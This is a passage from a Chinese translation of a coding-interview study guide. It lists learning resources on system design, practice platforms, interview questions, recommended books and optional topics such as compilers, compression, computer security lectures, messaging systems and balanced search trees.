href="#%E8%A7%86%E9%A2%91%E7%B3%BB%E5%88%97">视频系列部分</a>的“大规模数据挖掘”视频系列。</li></ul></li><li>[ ] 系统设计问题练习：下面有一些指导原则，每一个都有相关文档以及在现实中该如何处理。<ul><li>复习: <a href="https://github.com/donnemartin/system-design-primer">系统设计入门</a></li><li><a href="http://www.hiredintech.com/system-design/">HiredInTech 的系统设计</a></li><li><a href="https://github.com/jwasham/coding-interview-university/blob/master/extras/cheat%20sheets/system-design.pdf">备忘单</a></li><li>流程:<ol><li>理解问题和范围:<ul><li>在面试官的帮助下定义用例</li><li>提出附加功能的建议</li><li>去掉面试官认定范围以外的内容</li><li>假定高可用是必须的，而且要作为一个用例</li></ul></li><li>考虑约束:<ul><li>问一下每月请求量</li><li>问一下每秒请求量 (他们可能会主动提到或者让你算一下)</li><li>评估读写所占的百分比</li><li>评估的时候牢记 2/8 原则</li><li>每秒写多少数据</li><li>总的数据存储量要考虑超过 5 年的情况</li><li>每秒读多少数据</li></ul></li><li>抽象设计:<ul><li>分层 (服务, 数据, 缓存)</li><li>基础设施: 负载均衡, 消息</li><li>粗略的概括任何驱动整个服务的关键算法</li><li>考虑瓶颈并指出解决方案</li></ul></li></ol></li><li>练习:<ul><li><a href="http://repository.cmu.edu/cgi/viewcontent.cgi?article=2112&amp;context=compsci">设计一个 CDN 网络</a></li><li><a href="https://blog.twitter.com/2010/announcing-snowflake">设计一个随机唯一 ID 生成系统</a></li><li><a href="http://www.indieflashblog.com/how-to-create-an-asynchronous-multiplayer-game.html">设计一个在线多人卡牌游戏</a></li><li><a href="http://www.slideshare.net/dvirsky/introduction-to-redis">设计一个键值数据库</a></li><li><a href="http://highscalability.com/blog/2011/12/6/instagram-architecture-14-million-users-terabytes-of-photos.html">设计一个图片分享系统</a></li><li><a href="http://ijcai13.org/files/tutorial_slides/td3.pdf">设计一个推荐系统</a></li><li><a href="http://www.hiredintech.com/system-design/the-system-design-process/">设计一个短域名生成系统</a></li><li><a href="https://www.adayinthelifeof.nl/2011/02/06/memcache-internals/">设计一个缓存系统</a></li></ul></li></ul></li></ul><hr><h2><span id="zhong-mian">终面</span></h2><pre><code>这一部分有一些短视频，你可以快速的观看和复习大多数重要概念。这对经常性的巩固很有帮助。</code></pre><ul><li>[ ] 2-3分钟的简短主题视频系列（23个视频）<ul><li><a href="https://www.youtube.com/watch?v=r4r1DZcx1cM&amp;list=PLmVb1OknmNJuC5POdcDv5oCS7_OUkDgpj&amp;index=22">视频</a></li></ul></li><li>[ ] 2-5分钟的简短主题视频系列──Michael Sambol（18个视频）：<ul><li><a href="https://www.youtube.com/channel/UCzDJwLWoYCUQowF_nG3m5OQ">视频</a></li></ul></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part1">Sedgewick 视频 ── 算法I</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2">Sedgewick 视频 ── 算法II</a></li></ul><h2><span id="bian-cheng-wen-ti-lian-xi">编程问题练习</span></h2><p>现在你已经了解了上面所有的计算机科学主题，是时候练习回答编程问题了。</p><p><strong>编程问题的实践并不是要记住编程问题的答案</strong>。</p><p>为什么需要练习编程问题：</p><ul><li>快速识别问题，以及如何应用正确的数据结构及算法</li><li>收集问题的要求</li><li>像在面试中一样谈论问题</li><li>在白板或纸上而非计算机上编码</li><li>计算解决方案的时间和空间的复杂性</li><li>测试你的解决方案</li></ul><p>这里有个很棒的入门教学，内容是如何在面试中有条不紊，并且有互动沟通地解决问题。这种能力可以从面试书籍中获得，但我觉得这个也很棒：<a href="http://www.hiredintech.com/algorithm-design/">算法设计画布</a>。</p><p>家里没有白板？那讲得通。我是一个怪人，有一个很大的白板。从白板商店买了一个大的绘图板，而不是白板。你可以坐在沙发上练习。这是我的“沙发白板”。我在照片中添加了笔以便进行缩放。如果你使用笔，则希望可以擦除。快速变得凌乱。我用铅笔和橡皮擦。</p><p><img src="https://d3j2pkmjtin6ou.cloudfront.net/art_board_sm_2.jpg" alt="我的沙发白板"></p><p>补充：</p><ul><li><a href="https://www.topcoder.com/community/competitive-programming/tutorials/mathematics-for-topcoders/">Topcoder的数学</a></li><li><a href="https://www.topcoder.com/community/competitive-programming/tutorials/dynamic-programming-from-novice-to-advanced/">动态编程──从新手到高级</a></li><li><a href="https://web.archive.org/web/20160906124824/http://courses.csail.mit.edu/iap/interview/materials.php">MIT 面试材料</a></li><li><a href="http://exercism.io/languages">练习以掌握特定语言</a></li></ul><p><strong>阅读并练习编程问题（按此顺序）</strong>：</p><ul><li>[ ] <a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-047012167X.html">编程面试公开：下一份工作的秘密，第二版</a><ul><li>C，C ++ 和 Java 的答案</li></ul></li><li>[ ] <a href="http://www.amazon.com/Cracking-Coding-Interview-6th-Programming/dp/0984782850/">破解编码面试，第六版</a><ul><li>Java 答案</li></ul></li></ul><p>请参阅上方的<a href="#%E4%B9%A6%E5%8D%95">书单</a>。</p><h2><span id="bian-cheng-lian-xi-he-tiao-zhan">编程练习和挑战</span></h2><p>一旦你学会了理论基础，就应该把它们拿出来练练。尽量坚持每天做编码练习，越多越好。</p><ul><li><a href="https://www.topcoder.com/community/competitive-programming/tutorials/how-to-find-a-solution/">如何找到解决方案</a></li><li><a href="https://www.topcoder.com/community/competitive-programming/tutorials/how-to-dissect-a-topcoder-problem-statement/">如何剖析 Topcoder 题目描述</a></li></ul><p>编码面试问题视频：</p><ul><li><a href="https://www.youtube.com/watch?v=NBcqBddFbZw&amp;list=PLamzFoFxwoNjPfxzaWqs7cZGsPYy0x_gI">IDeserve（88个视频）</a></li><li><a href="https://www.youtube.com/user/tusharroy2525/playlists?shelf_id=2&amp;view=50&amp;sort=dd">Tushar Roy（5个播放列表）</a><ul><li>超级解决问题的方法</li></ul></li><li><a href="https://www.youtube.com/playlist?list=PLU_sdQYzUj2keVENTP0a5rdykRSgg9Wp-">Nick White──LeetCode 解题（187个视频）</a><ul><li>良好的解决方案和代码解释</li><li>你可以在短时间内看好几个</li></ul></li><li><a href="https://youtube.com/FisherCoder">FisherCoder──LeetCode 解题</a></li></ul><p>编码练习平台:</p><ul><li><a href="https://leetcode.com/">LeetCode</a><ul><li>我最喜欢的编码问题网站，值得你准备的1-2个月的订阅费用</li><li><a href="https://github.com/fishercoder1534/Leetcode">FisherCoder 的 LeetCode 解题</a></li><li>请参阅上面的 Nick White 视频，以获得简短的代码</li></ul></li><li><a href="https://www.hackerrank.com/">HackerRank</a></li><li><a href="https://www.topcoder.com/">TopCoder</a></li><li><a href="https://www.interviewcake.com/">InterviewCake</a></li><li><a href="http://www.geeksforgeeks.org/">http://www.geeksforgeeks.org/</a></li><li><a href="https://www.interviewbit.com/invite/icjf">InterviewBit</a></li><li><a href="https://projecteuler.net/index.php?section=problems">Project Euler (数学方向为主)</a></li><li><a href="https://code-exercises.com/">Code Exercises</a></li></ul><p>语言学习网站，附带编码挑战：</p><ul><li><a href="http://www.codewars.com">Codewars</a></li><li><a href="https://codility.com/programmers/">Codility</a></li><li><a href="https://www.hackerearth.com/">HackerEarth</a></li><li><a href="http://www.spoj.com/">Sphere Online Judge (spoj)</a></li><li><a href="https://www.codechef.com/">Codechef</a></li></ul><p>编码挑战项目：</p><ul><li><a href="https://github.com/donnemartin/interactive-coding-challenges">Python 交互式编码面试挑战</a></li></ul><p>模拟面试：</p><ul><li><a href="http://www.gainlo.co/">Gainlo.co：来自大公司的模拟面试官</a>──我使用了它，它帮助我减轻了电话屏幕和现场面试的压力</li><li><a href="https://www.pramp.com/">Pramp：模拟来自/与同行的面试</a>──点对点方式练习面试</li><li><a href="https://refdash.com/">Refdash：模拟面试和加急面试</a>──跳过与科技公司的多次面试，帮助求职者快速追踪</li><li><a href="https://interviewing.io/">interviewing.io：与高级工程师进行模拟面试</a>──与来自 FAANG（译者注：Facebook, Amazon, Apple, Netflix and Google） 的高级工程师进行匿名算法/系统设计面试。</li></ul><h2><span id="dang-ni-lin-jin-mian-shi-shi">当你临近面试时</span></h2><ul><li>搞定代码面试──第二集 (视频):<ul><li><a href="https://www.youtube.com/watch?v=4NIb9l3imAo">Cracking The Code Interview</a></li><li><a href="https://www.youtube.com/watch?v=Eg5-tdAwclo">Cracking the Coding Interview - 全栈系列</a></li></ul></li></ul><h2><span id="ni-de-jian-li">你的简历</span></h2><ul><li>请参阅“破解编码面试”和“编程面试的背面”中的建立准备项。</li></ul><h2><span id="dang-mian-shi-lai-lin-de-shi-hou">当面试来临的时候</span></h2><p>随着下面列举的问题思考下你可能会遇到的 20 个面试问题，每个问题准备 2-3 种回答。准备点故事，不要只是摆一些你完成的事情的数据，相信我，人人都喜欢听故事。</p><ul><li>你为什么想得到这份工作？</li><li>你解决过的最有难度的问题是什么？</li><li>面对过的最大挑战是什么?</li><li>见过的最好或者最坏的设计是怎么样的?</li><li>对某个产品提出改进建议。</li><li>你作为一个个体同时也是团队的一员，如何达到最好的工作状态?</li><li>你的什么技能或者经验是你的角色中不可或缺的，为什么？</li><li>你在某份工作或某个项目中最享受的是什么?</li><li>你在某份工作或某个项目中面临过的最大挑战是什么?</li><li>你在某份工作或某个项目中遇到过的最硬的 Bug 是什么样的？</li><li>你在某份工作或某个项目中学到了什么？</li><li>你在某份工作或某个项目中哪些地方还可以做的更好？</li></ul><h2><span id="wen-mian-shi-guan-de-wen-ti">问面试官的问题</span></h2><pre><code>我会问的一些：(可能我已经知道了答案但我想听听面试官的看法或者了解团队的前景):</code></pre><ul><li>团队多大规模?</li><li>开发周期是怎样的? 会使用瀑布流/极限编程/敏捷开发么?</li><li>经常会为截止日期（deadlines）加班么? 或者是有弹性的?</li><li>团队里怎么做技术选型?</li><li>每周平均开多少次会?</li><li>你觉得工作环境有助于员工集中精力吗?</li><li>目前正在做什么工作?</li><li>喜欢这些事情吗?</li><li>工作期限是怎么样的?</li><li>工作生活怎么平衡?</li></ul><h2><span id="dang-ni-huo-de-liao-meng-xiang-de-zhi-wei">当你获得了梦想的职位</span></h2><p>恭喜你！</p><p>继续学习。</p><p>活到老，学到老。</p><hr><pre><code>**********************************************************************************************************************************************************************************************************下面的内容都是可选的。通过学习这些内容，你将会得到更多的有关 CS 的概念，并将为所有的软件工程工作做更好的准备。你将会成为一个更全面的软件工程师。**********************************************************************************************************************************************************************************************************</code></pre><hr><h2><span id="e-wai-shu-ji">额外书籍</span></h2><pre><code>你可以从以下的书单挑选你有兴趣的主题来研读。</code></pre><ul><li><p><a href="https://www.amazon.com/dp/013937681X">UNIX环境高级编程</a></p><ul><li>老，但却很棒</li></ul></li><li><p><a href="https://www.amazon.com/dp/1593273894/">Linux 命令行大全</a></p><ul><li>现代选择</li></ul></li><li><p><a href="https://en.wikipedia.org/wiki/TCP/IP_Illustrated">TCP-IP详解系列</a></p></li><li><p><a href="https://www.amazon.com/gp/product/0596007124/">Head First 设计模式</a></p><ul><li>设计模式入门介绍</li></ul></li><li><p><a href="https://www.amazon.com/Design-Patterns-Elements-Reusable-Object-Oriented/dp/0201633612">设计模式：可复用面向对象软件的基础</a></p><ul><li>也被称为“四人帮”（Gang of Four(GOF)）</li><li>经典设计模式书籍</li></ul></li><li><p><a href="https://www.amazon.com/UNIX-Linux-System-Administration-Handbook/dp/0134277554/">Linux 和 UNIX 系统管理技术手册（第五版）</a></p></li><li><p><a href="http://www.amazon.com/Algorithm-Design-Manual-Steven-Skiena/dp/1849967202">算法设计手冊（Skiena）</a></p><ul><li>作为复习以及问题辨别</li><li>这本书中算法的部分难度已经超过面试会出现的</li><li>本书分为两个部分:<ul><li>数据结构和算法课本<ul><li>优点:<ul><li>跟其他算法课本一样是个很棒的复习素材</li><li>包含作者以往解决工业及学术上问题的经验的故事</li><li>含C语言代码示例</li></ul></li><li>缺点:<ul><li>某些地方跟《算法导论》（CLRS）一样艰深，但在某些主题，算法导论或许是更好的选择。</li><li>第7、8、9章有点难以消化，因为某些地方并没有解释得很清楚，或者根本上我就是个学渣</li><li>别会错意了，我很喜欢 Skiena 的教学方法以及他的风格。</li></ul></li></ul></li><li>算法目录:<ul><li>这个部分是买这本书的最大原因</li><li>我即将着手进行这部分，一旦完成这部分我会再更新上来</li></ul></li></ul></li><li>可以在 kindle 上租</li><li>解答：<ul><li><a href="http://www.algorithm.cs.sunysb.edu/algowiki/index.php/The_Algorithms_Design_Manual_(Second_Edition)">解答</a></li><li><a href="http://blog.panictank.net/category/algorithmndesignmanualsolutions/page/2/">解答</a></li></ul></li><li><a href="http://www3.cs.stonybrook.edu/~skiena/algorist/book/errata">勘误表</a></li></ul></li><li><p><a href="https://www.amazon.com/Write-Great-Code-Understanding-Machine/dp/1593270038">编程卓越之道（第一卷）：深入理解计算机</a></p><ul><li>该书于2004年出版，虽然有些过时，但是对于简单了解计算机而言，这是一个了不起的资源</li><li>作者发明了<a href="https://en.wikipedia.org/wiki/High_Level_Assembly">高阶组合语言 HLA</a>，所以提到，并且举了一些HLA的例子。里面没有用到很多，但都是很棒的组合语言的例子。</li><li>这些章节值得阅读，为你提供良好的基础：<ul><li>第2章──数字表示</li><li>第3章──二进制算术和位运算</li><li>第4章──浮点表示</li><li>第5章──字符表示</li><li>第6章──内存组织和访问</li><li>第7章──组合数据类型和内存对象</li><li>第9章──CPU体系结构</li><li>第10章──指令集架构</li><li>第11章──内存体系结构和组织</li></ul></li></ul></li><li><p><a href="https://www.amazon.com/Introduction-Algorithms-3rd-MIT-Press/dp/0262033844">算法导论</a></p><ul><li><strong>重要提示</strong>：读这本书的价值有限。本书很好地回顾了算法和数据结构，但不会教你如何编写良好的代码。你必须能够有效地编写一个不错的解决方案</li><li>又称 CLR，有时是 CLRS，因为 Stein 最后才加入</li></ul></li><li><p><a href="https://www.amazon.com/dp/0128119055">计算机体系结构：量化研究方法（第6版）</a></p><ul><li>更丰富、更新（2017年），但篇幅较长</li></ul></li><li><p><a href="http://www.amazon.com/Programming-Pearls-2nd-Jon-Bentley/dp/0201657880">编程珠矶</a></p><ul><li>前几章介绍了解决编程问题（非常古老，甚至还用数据磁带）的巧妙解决方案，但这只是一个介绍。这是关于程序设计和体系结构的指南</li></ul></li></ul><h2><span id="fu-jia-xue-xi">附加学习</span></h2><pre><code>我把它们加进来是为了让你成为更全方位的软件工程师，并且留意一些技术以及算法，让你拥有更大的工具箱。</code></pre><ul><li><h3><span id="bian-yi-qi">编译器</span></h3><ul><li><a href="https://www.youtube.com/watch?v=IhC7sdYe-Jg">编译器的工作方式，约1分钟（视频）</a></li><li><a href="https://www.youtube.com/watch?v=CSZLNYF4Klo">Harvard CS50-编译器（视频）</a></li><li><a href="https://www.youtube.com/watch?v=twodd1KFfGk">C ++（视频）</a></li><li><a href="https://www.youtube.com/watch?v=FnGCDLhaxKU">了解编译器优化（C ++）（视频）</a></li></ul></li><li><h3><span id="emacs-and-vi-m">Emacs and vi(m)</span></h3><ul><li>熟悉基于 unix 的代码编辑器</li><li>vi(m):<ul><li><a href="https://www.youtube.com/watch?v=5givLEMcINQ&amp;index=1&amp;list=PL13bz4SHGmRxlZVmWQ9DvXo1fEg4UdGkr">使用 vim 进行编辑 01 - 安装, 设置和模式 (视频)</a></li><li><a href="http://vim-adventures.com/">VIM 的冒险之旅</a></li><li>4 个视频集:<ul><li><a href="https://www.youtube.com/watch?v=SI8TeVMX8pk">vi/vim 编辑器 - 课程 1</a></li><li><a href="https://www.youtube.com/watch?v=F3OO7ZIOaJE">vi/vim 编辑器 - 课程 2</a></li><li><a href="https://www.youtube.com/watch?v=1lYD5gwgZIA">vi/vim 编辑器 - 课程 4</a></li><li><a href="https://www.youtube.com/watch?v=ZYEccA_nMaI">vi/vim 编辑器 - 课程 3</a></li></ul></li><li><a href="http://www.cs.yale.edu/homes/aspnes/classes/223/notes.html#Using_Vi_instead_of_Emacs">使用 Vi 而不是 Emacs</a></li></ul></li><li>emacs:<ul><li><a href="https://www.youtube.com/watch?v=hbmV1bnQ-i0">基础 Emacs 教程 (视频)</a></li><li>3 个视频集:<ul><li><a href="https://www.youtube.com/watch?v=ujODL7MD04Q">Emacs 教程 (初学者) -第 1 部分- 文件命令, 剪切/复制/粘贴,  自定义命令</a></li><li><a href="https://www.youtube.com/watch?v=XWpsRupJ4II">Emacs 教程 (初学者 -第 2 部分- Buffer 管理, 搜索, M-x grep 和 rgrep 模式</a></li><li><a href="https://www.youtube.com/watch?v=paSgzPso-yc">Emacs 教程 (初学者 -第 3 部分- 表达式, 声明, ~/.emacs 文件和包机制</a></li></ul></li><li><a href="https://www.youtube.com/watch?v=JWD1Fpdd4Pc">Evil 模式: 或许, 我是怎样对 Emacs 路人转粉的 (视频)</a></li><li><a href="http://www.cs.yale.edu/homes/aspnes/classes/223/notes.html#Writing_C_programs_with_Emacs">使用 Emacs 开发 C 程序</a></li><li><a href="https://www.youtube.com/watch?v=nsGYet02bEk">(或许) 深度组织模式:管理结构 (视频)</a></li></ul></li></ul></li><li><h3><span id="unix-ming-ling-xing-gong-ju">Unix 命令行工具</span></h3><ul><li>下列内容包含优秀工具</li><li>bash</li><li>cat</li><li>grep</li><li>sed</li><li>awk</li><li>curl or wget</li><li>sort</li><li>tr</li><li>uniq</li><li><a href="https://en.wikipedia.org/wiki/Strace">strace</a></li><li><a href="https://danielmiessler.com/study/tcpdump/">tcpdump</a></li></ul></li><li><h3><span id="xin-xi-lun-shi-pin">信息论 (视频)</span></h3><ul><li><a href="https://www.khanacademy.org/computing/computer-science/informationtheory">Khan Academy 可汗学院</a></li><li>更多有关马尔可夫的内容:<ul><li><a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/waxgx/core-markov-text-generation">马尔可夫内容生成（Core Markov Text Generation）</a></li><li><a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/gZhiC/core-implementing-markov-text-generation">Core Implementing Markov Text Generation马尔可夫内容生成实现</a></li><li><a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/EUjrq/project-markov-text-generation-walk-through">一个马尔可夫内容生成器的项目（Project = Markov Text Generation Walk Through）</a></li></ul></li><li>关于更多信息，请参照下方 MIT 6.050J 信息和系统复杂度的内容。</li></ul></li><li><h3><span id="qi-ou-xiao-yan-wei-amp-han-ming-ma-shi-pin">奇偶校验位 &amp; 汉明码 (视频)</span></h3><ul><li><a href="https://www.youtube.com/watch?v=q-3BctoUpHE">入门</a></li><li><a href="https://www.youtube.com/watch?v=DdMcAUlxh1M">奇偶校验位</a></li><li>汉明码(Hamming Code):<ul><li><a href="https://www.youtube.com/watch?v=1A_NcXxdoCc">发现错误</a></li><li><a href="https://www.youtube.com/watch?v=JAMLuxdHH8o">修正错误</a></li></ul></li><li><a href="https://www.youtube.com/watch?v=wbH2VxzmoZk">检查错误</a></li></ul></li><li><h3><span id="xi-tong-shang-zhi-entropy">系统熵值（Entropy）</span></h3><ul><li>请参考下方视频</li><li>观看之前，请先确定观看了信息论的视频</li><li><a href="https://youtu.be/JnJq3Py0dyM?t=176">信息理论, 克劳德·香农, 熵值, 系统冗余, 数据比特压缩 (视频)</a></li></ul></li><li><h3><span id="mi-ma-xue">密码学</span></h3><ul><li>请参考下方视频</li><li>观看之前，请先确定观看了信息论的视频</li><li><a href="https://www.khanacademy.org/computing/computer-science/%E5%AF%86%E7%A0%81%E5%AD%A6">可汗学院</a></li><li><a href="https://www.youtube.com/watch?v=KqqOXndnvic&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=30">密码学: 哈希函数</a></li><li><a href="https://www.youtube.com/watch?v=9TNI2wHmaeI&amp;index=31&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">密码学: 加密</a></li></ul></li><li><h3><span id="ya-suo">压缩</span></h3><ul><li>观看之前，请先确定观看了信息论的视频</li><li>Computerphile (视频)：<ul><li><a href="https://www.youtube.com/watch?v=Lto-ajuqW3w">压缩</a></li><li><a href="https://www.youtube.com/watch?v=M5c_RFKVkko">压缩熵值</a></li><li><a href="https://www.youtube.com/watch?v=umTbivyJoiI">由上而下的树 (霍夫曼编码树)</a></li><li><a href="https://www.youtube.com/watch?v=DV8efuB3h2g">额外比特 - 霍夫曼编码树</a></li><li><a href="https://www.youtube.com/watch?v=goOa3DGezUA">优雅的压缩数据 (无损数据压缩方法)</a></li><li><a href="https://www.youtube.com/watch?v=cCDCfoHTsaU">Text Compression Meets Probabilities</a></li></ul></li><li><a href="https://www.youtube.com/playlist?list=PLOU2XLYxmsIJGErt5rrCqaSGTMyyqNt2H">数据压缩的艺术</a></li><li><a href="https://www.youtube.com/watch?v=whGwm0Lky2s">(可选) 谷歌开发者：GZIP 还差远了呢!</a></li></ul></li><li><h3><span id="ji-suan-ji-an-quan">计算机安全</span></h3><ul><li><a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">MIT（23个视频）</a><ul><li><a href="https://www.youtube.com/watch?v=GqmQg-cszw4&amp;index=1&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">威胁模型：入门</a></li><li><a href="https://www.youtube.com/watch?v=6bwzNg5qQ0o&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh&amp;index=2">控制劫持攻击</a></li><li><a href="https://www.youtube.com/watch?v=drQyrzRoRiA&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh&amp;index=3">缓冲区溢出漏洞攻击和防御</a></li><li><a href="https://www.youtube.com/watch?v=6SIJmoE9L9g&amp;index=4&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">优先权区分</a></li><li><a href="https://www.youtube.com/watch?v=8VqTSY-11F4&amp;index=5&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">能力</a></li><li><a href="https://www.youtube.com/watch?v=VEV74hwASeU&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh&amp;index=6">在沙盒中运行原生代码</a></li><li><a href="https://www.youtube.com/watch?v=chkFBigodIw&amp;index=7&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">网络安全模型</a></li><li><a href="https://www.youtube.com/watch?v=EBQIGy1ROLY&amp;index=8&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">网络安全应用</a></li><li><a href="https://www.youtube.com/watch?v=yRVZPvHYHzw&amp;index=9&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">标志化执行</a></li><li><a href="https://www.youtube.com/watch?v=SIEVvk3NVuk&amp;index=11&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">网络安全</a></li><li><a href="https://www.youtube.com/watch?v=QOtA76ga_fY&amp;index=12&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">网络协议</a></li><li><a href="https://www.youtube.com/watch?v=PuVMkSEcPiI&amp;index=15&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">旁路攻击</a></li></ul></li></ul></li><li><h3><span id="la-ji-hui-shou">垃圾回收</span></h3><ul><li>[ ] <a href="https://www.youtube.com/watch?v=iHVs_HkjdmI">Python 中的垃圾回收 (视频)</a></li><li>[ ] <a href="https://www.infoq.com/presentations/garbage-collection-benefits">深度解析：论垃圾回收在 JAVA 中的重要性</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=P-8Z0-MhdQs&amp;list=PLdzf4Clw0VbOEWOS_sLhT_9zaiQDrS5AR&amp;index=3">深度解析：论垃圾回收在 Python 中的重要性(视频)</a></li></ul></li><li><h3><span id="bing-xing-bian-cheng">并行编程</span></h3><ul><li>[ ] <a href="https://www.coursera.org/learn/parprog1/home/week/1">Coursera (Scala)</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=uY85GkaYzBk">用于高性能并行计算的高效Python（视频）</a></li></ul></li><li><h3><span id="xiao-xi-chuan-di-xu-lie-hua-he-dui-lie-xi-tong">消息传递，序列化和队列系统</span></h3><ul><li><a href="https://thrift.apache.org/">Thrift</a><ul><li><a href="http://thrift-tutorial.readthedocs.io/en/latest/intro.html">教程</a></li></ul></li><li><a href="https://developers.google.com/protocol-buffers/">协议缓冲</a><ul><li><a href="https://developers.google.com/protocol-buffers/docs/tutorials">教程</a></li></ul></li><li><a href="http://www.grpc.io/">gRPC</a><ul><li><a href="https://www.youtube.com/watch?v=5tmPvSe7xXQ&amp;list=PLcTqM9n_dieN0k1nSeN36Z_ppKnvMJoly&amp;index=1">gRPC 对于JAVA开发者的入门教程（视频）</a></li></ul></li><li><a href="http://redis.io/">Redis</a><ul><li><a href="http://try.redis.io/">教程</a></li></ul></li><li><a href="https://aws.amazon.com/sqs/">Amazon的 SQS 系统 (队列)</a></li><li><a href="https://aws.amazon.com/sns/">Amazon的 SNS 系统 (pub-sub)</a></li><li><a href="https://www.rabbitmq.com/">RabbitMQ</a><ul><li><a href="https://www.rabbitmq.com/getstarted.html">入门教程</a></li></ul></li><li><a href="http://www.celeryproject.org/">Celery</a><ul><li><a href="http://docs.celeryproject.org/en/latest/getting-started/first-steps-with-celery.html">Celery入门</a></li></ul></li><li><a href="http://zeromq.org/">ZeroMQ</a><ul><li><a href="http://zeromq.org/intro:read-the-manual">入门教程</a></li></ul></li><li><a href="http://activemq.apache.org/">ActiveMQ</a></li><li><a href="http://kafka.apache.org/documentation.html#introduction">Kafka</a></li><li><a href="http://msgpack.org/index.html">MessagePack</a></li><li><a href="https://avro.apache.org/">Avro</a></li></ul></li><li><h3><span id="a-sou-suo-suan-fa">A*搜索算法</span></h3><ul><li><a href="https://en.wikipedia.org/wiki/A*_search_algorithm">A 搜索算法</a></li><li><a href="https://www.youtube.com/watch?v=KNXfSOx4eEE">A* 路径搜索教程（教程）</a></li><li><a href="https://www.youtube.com/watch?v=-L-WgKMFuhE">A* 路径搜索（E01：算法解释）（视频）</a></li></ul></li><li><h3><span id="kuai-su-fu-li-xie-bian-huan">快速傅里叶变换</span></h3><ul><li><a href="https://betterexplained.com/articles/an-interactive-guide-to-the-fourier-transform/">傅立叶变换的交互式指南</a></li><li><a href="http://www.askamathematician.com/2012/09/q-what-is-a-fourier-transform-what-is-it-used-for/">什么是傅立叶变换？论傅立叶变换的用途</a></li><li><a href="https://www.youtube.com/watch?v=Xxut2PN-V8Q">什么是傅立叶变换？ (视频)</a></li><li><a href="https://www.youtube.com/watch?v=iTMn0Kt18tg&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=4">分而治之：FFT（视频）</a></li><li><a href="http://jakevdp.github.io/blog/2013/08/28/understanding-the-fft/">FTT 是什么</a></li></ul></li><li><h3><span id="bu-long-guo-lu-qi">布隆过滤器</span></h3><ul><li>给定布隆过滤器m比特位和k个哈希函数，插入和成员检测都会是 O(k)。</li><li><a href="https://www.youtube.com/watch?v=-SuTGoFYjZs">布隆过滤器（视频）</a></li><li><a href="https://www.youtube.com/watch?v=qBTdukbzc78">布隆过滤器 | 数据挖掘 | Stanford University（视频）</a></li><li><a href="http://billmill.org/bloomfilter-tutorial/">教程</a></li><li><a href="http://blog.michaelschmatz.com/2016/04/11/how-to-write-a-bloom-filter-cpp/">如何写一个布隆过滤器应用</a></li></ul></li><li><h3><span id="hyperloglog">HyperLogLog</span></h3><ul><li><a href="http://highscalability.com/blog/2012/4/5/big-data-counting-how-to-count-a-billion-distinct-objects-us.html">如何仅使用1.5KB内存计算十亿个不同的对象</a></li></ul></li><li><h3><span id="ju-bu-min-gan-ha-xi">局部敏感哈希</span></h3><ul><li>用于确定文件的相似性</li><li>MD5 或 SHA 的反义词，用于确定2个文档/字符串是否完全相同</li><li><a href="http://ferd.ca/simhashing-hopefully-made-simple.html">Simhashing（希望如此）变得简单</a></li></ul></li><li><h3><span id="van-emde-boas-shu">van Emde Boas 树</span></h3><ul><li><a href="https://www.youtube.com/watch?v=hmReJCupbNU&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=6">分而治之：van Emde Boas 树 (视频)</a></li><li><a href="https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-046j-design-and-analysis-of-algorithms-spring-2012/lecture-notes/MIT6_046JS12_lec15.pdf">MIT课堂笔记</a></li></ul></li><li><h3><span id="zeng-qiang-shu-ju-jie-gou">增强数据结构</span></h3><ul><li><a href="https://youtu.be/zksIj9O8_jc?list=PL4BBB74C7D2A1049C&amp;t=950">CS 61B 第 39 课: 增强数据结构</a></li></ul></li><li><h3><span id="ping-heng-cha-zhao-shu-balanced-search-trees">平衡查找树（Balanced search trees）</span></h3><ul><li><p>掌握至少一种平衡查找树（并懂得如何实现）：</p></li><li><p>“在各种平衡查找树当中，AVL 树和2-3树已经成为了过去，而红黑树（red-black trees）看似变得越来越受人青睐。这种令人特别感兴趣的数据结构，亦称伸展树（splay tree）。它可以自我管理，且会使用轮换来移除任何访问过根节点的键。” —— Skiena</p></li><li><p>因此，在各种各样的平衡查找树当中，我选择了伸展树来实现。虽然，通过我的阅读，我发现在面试中并不会被要求实现一棵平衡查找树。但是，为了胜人一筹，我们还是应该看看如何去实现。在阅读了大量关于红黑树的代码后，我才发现伸展树的实现确实会使得各方面更为高效。</p><ul><li>伸展树：插入、查找、删除函数的实现，而如果你最终实现了红黑树，那么请尝试一下：</li><li>跳过删除函数，直接实现搜索和插入功能</li></ul></li><li><p>我希望能阅读到更多关于 B 树的资料，因为它也被广泛地应用到大型的数据集当中。</p></li><li><p><a href="https://en.wikipedia.org/wiki/Self-balancing_binary_search_tree">自平衡二叉查找树</a></p></li><li><p><strong>AVL 树</strong></p><ul><li>实际中：我能告诉你的是，该种树并无太多的用途，但我能看到有用的地方在哪里：AVL 树是另一种平衡查找树结构。其可支持时间复杂度为 O(log n) 